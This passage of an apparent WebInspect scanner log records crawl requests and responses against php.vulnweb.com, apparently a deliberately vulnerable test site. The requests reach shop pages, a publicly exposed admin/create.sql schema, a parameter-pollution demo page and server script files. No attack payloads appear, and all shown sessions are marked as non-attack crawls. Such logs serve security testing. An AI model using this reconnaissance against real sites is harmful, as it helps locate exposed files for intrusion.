				]]></RawResponse><Request id="D0A7402B83800F606909C145FDDC0FB3"><Method>GET</Method><Path>/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="D0A7402B83800F606909C145FDDC0FB3";PSID="6A3E6B22313623A0E6D1F5887F392849";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="1657cc8f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="c4cef0d5";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div><img src='/Mod_Rewrite_Shop/images/1.jpg'><b>Network Storage D-Link DNS-313 enclosure 1 x SATA</b><br><br>NET STORAGE ENCLOSURE SATA DNS-313 D-LINK<br><a href='/Mod_Rewrite_Shop/BuyProduct-1/'>Buy</a>&nbsp;<a href='/Mod_Rewrite_Shop/RateProduct-1.html'>Rate</a></div><hr><a href='/Mod_Rewrite_Shop/'>Back</a>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:46 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>319</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="6BDEF4BFB9439BD2321C1C813C3137C9"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="6BDEF4BFB9439BD2321C1C813C3137C9"><![CDATA[GET /Mod_Rewrite_Shop/Details/web-camera-a4tech/2/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="6BDEF4BFB9439BD2321C1C813C3137C9";PSID="6A3E6B22313623A0E6D1F5887F392849";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="91b2011d";
X-Request-Memo: ID="e6450bd5";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:46 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 279

<div><img src='/Mod_Rewrite_Shop/images/2.jpg'><b>Web Camera A4Tech PK-335E</b><br><br>Web Camera A4Tech PK-335E<br><a href='/Mod_Rewrite_Shop/BuyProduct-2/'>Buy</a>&nbsp;<a href='/Mod_Rewrite_Shop/RateProduct-2.html'>Rate</a></div><hr><a href='/Mod_Rewrite_Shop/'>Back</a>
				]]></RawResponse><Request id="6BDEF4BFB9439BD2321C1C813C3137C9"><Method>GET</Method><Path>/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="6BDEF4BFB9439BD2321C1C813C3137C9";PSID="6A3E6B22313623A0E6D1F5887F392849";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="91b2011d";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="e6450bd5";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div><img src='/Mod_Rewrite_Shop/images/2.jpg'><b>Web Camera A4Tech PK-335E</b><br><br>Web Camera A4Tech PK-335E<br><a href='/Mod_Rewrite_Shop/BuyProduct-2/'>Buy</a>&nbsp;<a href='/Mod_Rewrite_Shop/RateProduct-2.html'>Rate</a></div><hr><a href='/Mod_Rewrite_Shop/'>Back</a>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:46 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>279</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C5108DB0FA7ED2396B7E31B5E4BABFC9"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/Details/color-printer/3/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="C5108DB0FA7ED2396B7E31B5E4BABFC9"><![CDATA[GET /Mod_Rewrite_Shop/Details/color-printer/3/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="C5108DB0FA7ED2396B7E31B5E4BABFC9";PSID="6A3E6B22313623A0E6D1F5887F392849";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="10bda329";
X-Request-Memo: ID="b89680eb";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:47 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 313

<div><img src='/Mod_Rewrite_Shop/images/3.jpg'><b>Laser Color Printer HP LaserJet M551dn, A4</b><br><br>Laser Color Printer HP LaserJet M551dn, A4<br><a href='/Mod_Rewrite_Shop/BuyProduct-3/'>Buy</a>&nbsp;<a href='/Mod_Rewrite_Shop/RateProduct-3.html'>Rate</a></div><hr><a href='/Mod_Rewrite_Shop/'>Back</a>
				]]></RawResponse><Request id="C5108DB0FA7ED2396B7E31B5E4BABFC9"><Method>GET</Method><Path>/Mod_Rewrite_Shop/Details/color-printer/3/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="C5108DB0FA7ED2396B7E31B5E4BABFC9";PSID="6A3E6B22313623A0E6D1F5887F392849";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="10bda329";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="b89680eb";sc="1";tid="37";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<div><img src='/Mod_Rewrite_Shop/images/3.jpg'><b>Laser Color Printer HP LaserJet M551dn, A4</b><br><br>Laser Color Printer HP LaserJet M551dn, A4<br><a href='/Mod_Rewrite_Shop/BuyProduct-3/'>Buy</a>&nbsp;<a href='/Mod_Rewrite_Shop/RateProduct-3.html'>Rate</a></div><hr><a href='/Mod_Rewrite_Shop/'>Back</a>
				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:47 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>313</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="097734997FF12C4487A1EEC4E79B2504"><URL>http://php.vulnweb.com:80/admin/create.sql</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="097734997FF12C4487A1EEC4E79B2504"><![CDATA[GET /admin/create.sql HTTP/1.1
Referer: http://php.vulnweb.com/admin/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="097734997FF12C4487A1EEC4E79B2504";PSID="D6E304C342FB8CA68120AE0C7B7A270A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="93f2d68e";
X-Request-Memo: ID="185f5c62";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:47 GMT
ETag: "4dca64a4-20b"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 523

create database waspart;
use waspart;

CREATE TABLE IF NOT EXISTS forum(
	sender 		CHAR(150),
	mesaj 		TEXT,
	senttime	INTEGER(32));
	
CREATE TABLE IF NOT EXISTS artists(
	artist_id	INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	aname		CHAR(50),
	adesc		BLOB);
	
CREATE TABLE IF NOT EXISTS categ(
	cat_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	cname		CHAR(50),
	cdesc		BLOB);
	
CREATE TABLE IF NOT EXISTS pictures(
	pic_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	pshort		BLOB,
	plong		TEXT,
	price		INTEGER,
	img			CHAR(50));

]]></RawResponse><Request id="097734997FF12C4487A1EEC4E79B2504"><Method>GET</Method><Path>/admin/</Path><File>create</File><Ext>sql</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/admin/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="097734997FF12C4487A1EEC4E79B2504";PSID="D6E304C342FB8CA68120AE0C7B7A270A";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="93f2d68e";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="185f5c62";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[create database waspart;
use waspart;

CREATE TABLE IF NOT EXISTS forum(
	sender 		CHAR(150),
	mesaj 		TEXT,
	senttime	INTEGER(32));
	
CREATE TABLE IF NOT EXISTS artists(
	artist_id	INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	aname		CHAR(50),
	adesc		BLOB);
	
CREATE TABLE IF NOT EXISTS categ(
	cat_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	cname		CHAR(50),
	cdesc		BLOB);
	
CREATE TABLE IF NOT EXISTS pictures(
	pic_id		INTEGER(5) PRIMARY KEY AUTO_INCREMENT,
	pshort		BLOB,
	plong		TEXT,
	price		INTEGER,
	img			CHAR(50));

]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:47 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-20b"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>523</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="E0CFF3E541D0BBC6B753F7FE5A134428"><URL>http://php.vulnweb.com:80/hpp/?pp=12</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="E0CFF3E541D0BBC6B753F7FE5A134428"><![CDATA[GET /hpp/?pp=12 HTTP/1.1
Referer: http://php.vulnweb.com/hpp/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="E0CFF3E541D0BBC6B753F7FE5A134428";PSID="04A7DE02AE4076FC68850A0F3E81559D";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="71d0c623";
X-Request-Memo: ID="17dec8b0";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:47 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 383

<title>HTTP Parameter Pollution Example</title>

<a href="?pp=12">check</a><br/>
<a href="params.php?p=valid&pp=12">link1</a><br/><a href="params.php?p=valid&pp=12">link2</a><br/><form action="params.php?p=valid&pp=12"><input type=submit name=aaaa/></form><br/>
<hr>
<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>]]></RawResponse><Request id="E0CFF3E541D0BBC6B753F7FE5A134428"><Method>GET</Method><Path>/hpp/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>pp=12</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>pp</Name><Value>12</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/hpp/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="E0CFF3E541D0BBC6B753F7FE5A134428";PSID="04A7DE02AE4076FC68850A0F3E81559D";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="71d0c623";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="17dec8b0";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<title>HTTP Parameter Pollution Example</title>

<a href="?pp=12">check</a><br/>
<a href="params.php?p=valid&pp=12">link1</a><br/><a href="params.php?p=valid&pp=12">link2</a><br/><form action="params.php?p=valid&pp=12"><input type=submit name=aaaa/></form><br/>
<hr>
<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:47 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>383</Value></Header></Headers><SetCookies /><Forms><Form><Action>params.php?p=valid&amp;pp=12</Action><Method /><Name /><OnSubmit /><InputFields><InputField><Name>aaaa</Name><Value /><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="3BF161C1872B797BE3755BA4592EAF92"><URL>http://php.vulnweb.com:80/_mmServerScripts/MMHTTPDB.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="3BF161C1872B797BE3755BA4592EAF92"><![CDATA[GET /_mmServerScripts/MMHTTPDB.php HTTP/1.1
Referer: http://php.vulnweb.com/_mmServerScripts/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="3BF161C1872B797BE3755BA4592EAF92";PSID="A1CEE9CF6012D777107AAAB260D61287";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="473791bc";
X-Request-Memo: ID="92f96096";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:47 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Accept-Charset: UTF-8
Content-Length: 93

<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'></head></html>]]></RawResponse><Request id="3BF161C1872B797BE3755BA4592EAF92"><Method>GET</Method><Path>/_mmServerScripts/</Path><File>MMHTTPDB</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/_mmServerScripts/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="3BF161C1872B797BE3755BA4592EAF92";PSID="A1CEE9CF6012D777107AAAB260D61287";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="473791bc";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="92f96096";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'></head></html>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:47 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Accept-Charset</Name><Value>UTF-8</Value></Header><Header><Name>Content-Length</Name><Value>93</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="CFFD08A5584F7DA1C8D9D7C07E63DE5A"><URL>http://php.vulnweb.com:80/_mmServerScripts/mysql.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="CFFD08A5584F7DA1C8D9D7C07E63DE5A"><![CDATA[GET /_mmServerScripts/mysql.php HTTP/1.1
Referer: http://php.vulnweb.com/_mmServerScripts/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="CFFD08A5584F7DA1C8D9D7C07E63DE5A";PSID="A1CEE9CF6012D777107AAAB260D61287";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="2443010b";
X-Request-Memo: ID="0a8e6536";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
